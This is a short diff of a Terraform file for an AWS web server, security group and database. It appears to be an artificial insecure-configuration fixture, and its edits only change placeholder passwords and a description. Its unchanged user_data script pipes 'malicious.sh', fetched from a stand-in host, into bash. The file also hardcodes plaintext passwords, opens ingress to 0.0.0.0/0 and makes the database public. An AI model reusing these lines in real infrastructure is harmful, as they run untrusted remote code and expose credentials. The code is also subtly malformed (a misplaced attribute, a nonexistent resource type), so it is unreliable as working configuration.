@@ -10,7 +10,7 @@ resource "aws_instance" "web_server" {
 
   user_data = <<-EOF
     #!/bin/bash
-    echo "Sensitive data: password123" > /etc/secret.txt
+    echo "Sensitive data: password1234" > /etc/secret.txt
     sudo curl http://example.com/malicious.sh | bash
   EOF
   tags = {
@@ -30,7 +30,7 @@ resource "aws_security_group" "web_sg" {
     protocol    = "tcp"
     cidr_blocks = ["0.0.0.0/0"]
   }  name_prefix = "web-sg-"
-  description = "Web server security group"
+  description = "Web server security group1"
 
 
   ingress {
@@ -84,7 +84,7 @@ resource "aws_rds_instance" "app_database" {
   instance_class     = "db.t2.micro"
   allocated_storage  = 5
   username           = "admin"
-  password           = "R@nd0mP@ss12345"
+  password           = "R@nd0mP@ss123456"
   publicly_accessible = true
 
 
